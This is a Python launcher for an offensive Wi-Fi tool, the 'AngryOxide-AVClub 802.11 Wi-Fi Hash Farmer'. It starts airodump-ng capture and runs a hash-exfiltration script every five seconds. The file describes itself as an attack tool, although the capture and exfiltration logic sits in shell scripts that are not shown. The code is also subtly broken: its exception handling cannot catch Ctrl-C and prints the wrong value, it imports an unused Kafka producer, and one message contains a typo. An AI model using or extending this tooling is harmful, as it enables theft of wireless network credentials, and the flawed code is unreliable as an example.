import subprocess
import time
import sys
from kafka import KafkaProducer

# ======================
# Global Configurations
# ======================

WELCOME_MESSAGE = \
  r">>============================================<<" + "\n"\
+ r"||     _    ___               ___     ______  ||"  + "\n"\
+ r"||    / \  / _ \             / \ \   / / ___| ||"  + "\n"\
+ r"||   / _ \| | | |  _____    / _ \ \ / / |     ||"  + " by dr0pp1n\n"\
+ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.2a\n"\
+ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 250915\n"\
+ r"||                                            ||"  + "\n"\
+ r">>============================================<<"  + "\n"\
+ "[*] AngryOxide-AVClub 802.11 Wi-Fi Hash Farmer starting up...\n"\
+ "[!] Send SIGINT (Ctrl-C) to exit.\n"

EXFIL_INTERVAL = 5  # Interval in seconds to exfiltrate hashes

# ======================
# Helper Functions
# ======================


# ======================
# Main Function
# ======================
def main():
    print("[*] Cleaning up...")
    subprocess.run(["./cleanup.sh"])

    print("[*] Starting attack modules...")
    ### Start AngryOxide subprocess
    #am1 = "./AgOx.sh"
    #am1p = subprocess.Popen([am1], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    #print(f"[*] Started AngryOxide with PID {am1p.pid}")
    
    ### Start airodump-ng subprocess
    am2 = "./airodump.sh"
    am2p = subprocess.Popen([am2], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[*] Started airodump-ng with PID {am2p.pid}")
    print(f"[*] PusExfiltrating hashes every {EXFIL_INTERVAL} seconds...")
    while True:
        try:
            subprocess.run(["./exfil_hash.sh"])
            time.sleep(EXFIL_INTERVAL)
        except Exception or KeyboardInterrupt:
            if Exception:
                print(f"[!] Exception occurred: {Exception}")
            else:
                print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
                print("[*] Terminating subprocesses...")
                #am1p.terminate()
                am2p.terminate()

# ======================
# Main Loop
# ======================
if __name__ == "__main__":
    try:
        print(WELCOME_MESSAGE)
        main()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(0)
